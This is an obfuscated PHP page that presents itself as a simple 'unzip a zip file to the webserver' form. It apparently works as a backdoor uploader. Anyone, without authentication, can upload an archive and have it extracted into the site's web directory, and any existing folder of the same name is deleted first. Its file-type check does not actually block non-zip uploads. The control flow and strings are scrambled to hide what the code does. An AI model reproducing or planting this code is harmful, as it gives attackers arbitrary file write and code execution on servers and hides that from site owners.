<?php
 goto RZFcD; b8HZT: ?>
<!doctypehtml><html xmlns="http://www.w3.org/1999/xhtml"><head><meta content="text/html; charset=UTF-8"http-equiv="Content-Type"><title>Unzip a zip file to the webserver</title></head><body><?php  goto fLEEM; fLEEM: if ($message) { echo "\x3c\x70\76{$message}\x3c\57\x70\76"; } goto Nh10o; RZFcD: function rmdir_recursive($dir) { foreach (scandir($dir) as $file) { if ("\56" === $file || "\56\x2e" === $file) { continue; } if (is_dir("{$dir}\57{$file}")) { rmdir_recursive("{$dir}\x2f{$file}"); } else { unlink("{$dir}\57{$file}"); } } rmdir($dir); } goto Zpi_D; Zpi_D: if ($_FILES["\172\x69\x70\137\x66\x69\x6c\x65"]["\156\x61\x6d\145"]) { $filename = $_FILES["\x7a\x69\x70\137\146\x69\x6c\145"]["\x6e\x61\x6d\x65"]; $source = $_FILES["\172\151\x70\137\146\x69\154\x65"]["\x74\155\160\x5f\156\x61\155\x65"]; $type = $_FILES["\172\x69\160\x5f\146\x69\154\x65"]["\164\x79\x70\145"]; $name = explode("\56", $filename); $accepted_types = array("\141\160\x70\154\x69\143\141\164\151\x6f\156\57\x7a\151\x70", "\141\160\x70\x6c\151\143\x61\164\151\157\x6e\x2f\x78\x2d\x7a\151\160\55\143\x6f\155\x70\x72\145\163\x73\x65\x64", "\155\165\154\x74\151\160\x61\x72\164\57\170\55\x7a\x69\x70", "\141\160\160\x6c\x69\x63\141\x74\151\x6f\x6e\x2f\x78\55\x63\x6f\x6d\160\x72\x65\x73\x73\x65\x64"); foreach ($accepted_types as $mime_type) { if ($mime_type == $type) { $okay = true; break; } } $continue = strtolower($name[1]) == "\x7a\x69\160" ? true : false; if (!$continue) { $message = "\x54\x68\145\x20\x66\x69\154\x65\x20\171\x6f\165\x20\141\162\145\x20\x74\162\171\151\156\147\40\x74\x6f\x20\x75\160\154\157\141\x64\40\151\x73\40\156\157\164\40\141\40\x2e\172\151\160\x20\146\151\154\x65\56\40\x50\x6c\x65\x61\x73\x65\40\x74\x72\171\x20\141\147\x61\x69\x6e\56"; } $path = dirname(__FILE__) . "\x2f"; $filenoext = basename($filename, "\56\x7a\x69\160"); $filenoext = basename($filenoext, "\x2e\132\x49\x50"); $targetdir = $path . $filenoext; $targetzip = $path . $filename; if (is_dir($targetdir)) { rmdir_recursive($targetdir); } mkdir($targetdir, 511); if (move_uploaded_file($source, $targetzip)) { $zip = new ZipArchive(); $x = $zip->open($targetzip); if ($x === true) { $zip->extractTo($targetdir); $zip->close(); unlink($targetzip); } $message = "\131\157\165\162\x20\x2e\x7a\151\x70\x20\146\x69\x6c\145\x20\167\141\163\x20\165\160\x6c\157\141\x64\x65\x64\40\141\156\144\40\165\x6e\160\141\143\153\145\x64\56"; } else { $message = "\124\150\145\162\145\x20\x77\141\x73\40\x61\40\160\x72\x6f\142\154\x65\x6d\40\x77\151\x74\150\40\164\150\145\40\x75\160\154\x6f\141\x64\x2e\x20\x50\154\145\x61\163\x65\40\x74\x72\171\40\141\x67\141\x69\156\56"; } } goto b8HZT; Nh10o: ?>
<form action=""enctype="multipart/form-data"method="post"><label>Choose a zip file to upload: <input name="zip_file"type="file"></label><br><input name="submit"type="submit"value="Upload"></form></body></html>
